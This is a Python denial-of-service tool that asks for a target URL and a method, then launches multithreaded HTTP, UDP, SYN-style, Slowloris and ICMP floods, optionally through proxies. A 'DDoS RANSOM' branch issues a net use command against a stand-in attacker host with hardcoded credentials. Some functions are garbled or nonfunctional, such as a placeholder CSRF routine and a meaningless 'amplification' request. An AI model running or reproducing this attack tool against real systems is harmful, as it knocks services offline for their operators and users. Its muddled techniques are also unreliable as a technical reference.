import requests
import subprocess
import threading
import time
import socket
import random

def send_ddos_request(target, method, payload_size_mb=1, total_data_tb=1, proxy=None):
    payload_size = payload_size_mb * 1024 * 1024  # Convert MB to bytes
    total_data = total_data_tb * 1024 * 1024 * 1024 * 1024  # Convert TB to bytes
    total_requests = total_data // payload_size

    payload = "x" * payload_size

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
    }

    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    def make_request():
        for _ in range(total_requests // 100):  # Distribute the requests among threads
            try:
                if method == "DDoS AMP":
                    amplification_target = "amplification-site.com"
                    requests.get(f"http://{amplification_target}/{payload}", headers={"Referer": f"http://{target}/{payload}"})
                elif method == "DDoS RANSOM":
                    ransomware_payload = "ransomware.exe"
                    subprocess.run(f"net use \\\\attacker.com\\{ransomware_payload} /user:admin password", shell=True)
                elif method == "DDoS CSRF":
                    layer7_csrf(target)
                elif method == "SYN Flood":
                    syn_flood(target)
                elif method == "UDP Flood":
                    udp_flood(target)
                elif method == "HTTP Flood":
                    http_flood(target, headers, payload, proxies)
                elif method == "Slowloris":
                    slowloris(target)
                elif method == "ICMP Flood":
                    icmp_flood(target)
                else:
                    response = requests.post(f"http://{target}", headers=headers, data=payload, proxies=proxies)
                    print(f"Response status code: {response.status_code}")
            except Exception as e:
                print(f"An error occurred: {e}")
            time.sleep(0.01)  # Sleep to avoid overwhelming the target immediately

    threads = []
    for _ in range(100):  # Using 100 threads to speed up the process
        thread = threading.Thread(target=make_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def layer7_csrf(target):
    # Placeholder function for CSRF attack
    print(f"CSRF attack initiated on {target}")

def syn_flood(target):
    target_ip = socket.gethostbyname(target)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            sock.connect((target_ip, 80))
            sock.sendto(("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target)).encode(), (target_ip, 80))
        except socket.error:
            pass

def udp_flood(target):
    target_ip = socket.gethostbyname(target)
    message = b'X' * 1024
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(message, (target_ip, 80))
        except socket.error:
            pass

def http_flood(target, headers, payload, proxies):
    while True:
        try:
            response = requests.post(f"http://{target}", headers=headers, data=payload, proxies=proxies)
            print(f"HTTP Flood response status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Flood error: {e}")

def slowloris(target):
    target_ip = socket.gethostbyname(target)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 80))
            s.send(("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000))).encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            time.sleep(15)
        except socket.error:
            pass

def icmp_flood(target):
    target_ip = socket.gethostbyname(target)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.sendto(b'\x08\x00\x00\x00' + b'X' * 48, (target_ip, 1))
        except socket.error:
            pass

# Contoh penggunaan
if __name__ == "__main__":
    target = input("Enter the target URL: ")
    method = input("Enter the attack method (DDoS AMP, DDoS RANSOM, DDoS CSRF, SYN Flood, UDP Flood, HTTP Flood, Slowloris, ICMP Flood): ")
    proxy = input("Enter the proxy (format: http://proxy:port) or leave blank for no proxy: ")
    send_ddos_request(target, method, payload_size_mb=1, total_data_tb=1, proxy=proxy if proxy else None)